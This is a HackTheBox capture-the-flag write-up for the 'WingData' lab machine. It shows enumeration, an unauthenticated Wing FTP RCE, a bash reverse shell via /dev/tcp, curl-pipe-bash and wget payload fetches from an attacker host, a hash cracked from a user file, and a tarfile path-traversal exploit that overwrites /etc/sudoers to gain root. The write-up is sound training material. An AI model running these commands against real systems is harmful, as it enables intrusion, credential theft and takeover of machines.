# HackTheBox - WingData Writeup
**Difficulty:** Easy | **OS:** Linux | **Season:** 10

![HTB](https://img.shields.io/badge/HackTheBox-WingData-green)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen)

## Summary
WingData is an Easy Linux machine demonstrating a full attack chain from 
unauthenticated service exploitation to root privilege escalation.

**Attack Chain:**
RCE (CVE-2025-47812) → Credential Extraction → Hash Cracking → SSH → Root (CVE-2025-4517)

---

## Enumeration

### Nmap
```bash
nmap -sCV -A 10.129.244.106
```
**Open Ports:**
- 22/tcp — OpenSSH 9.2p1 (Debian)
- 80/tcp — Apache 2.4.66 → redirects to `wingdata.htb`

### /etc/hosts
```bash
echo "10.129.244.106 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Directory Fuzzing
```bash
ffuf -u http://wingdata.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,403 -t 40
```
Notable findings: `/assets`, `/vendor`

### FTP Subdomain
Browsing to `http://ftp.wingdata.htb` reveals:
**Wing FTP Server v7.4.3** — vulnerable to CVE-2025-47812

---

## Initial Access — CVE-2025-47812 (Unauthenticated RCE)

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

Start listener:
```bash
nc -lvnp 5555
```

Serve payload and exploit:
```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/5555 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8080

python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
        -c "curl http://YOUR_IP:8080/shell.sh|bash" -v
```

Shell received as `wingftp` user.

---

## Credential Extraction

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Extracted hash:
### Hash Cracking (Hashcat)
```bash
echo "HASH:WingFTP" > wacky.txt
hashcat -m 1410 wacky.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:** `!#7Blushing^*Bride5`

---

## Lateral Movement — SSH as wacky

```bash
ssh wacky@10.129.244.106
# password: !#7Blushing^*Bride5
cat ~/user.txt  # User flag ✅
```

---

## Privilege Escalation — CVE-2025-4517

### Sudo Enumeration
```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The backup restore script runs as root and uses `tarfile.extractall()` 
insecurely, allowing a malicious tar archive to overwrite `/etc/sudoers`.

### Exploit
```bash
# On Kali
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
cd CVE-2025-4517-POC-HTB-WingData
python3 -m http.server 80

# On target
cd /tmp
wget http://YOUR_IP/CVE-2025-4517-POC.py
python3 /tmp/CVE-2025-4517-POC.py
```

### Root Shell
```bash
sudo /bin/bash
id       # uid=0(root)
cat /root/root.txt  # Root flag ✅
```

---

## CVEs Referenced
| CVE | Description |
|-----|-------------|
| CVE-2025-47812 | Wing FTP Server v7.4.3 Unauthenticated RCE |
| CVE-2025-4517 | Python tarfile path traversal via insecure extraction |

---

## Tools Used
- nmap
- ffuf
- netcat
- hashcat
- Python3

---

*Writeup by [KARIM ELSHEIKH] — HackTheBox Season 10*
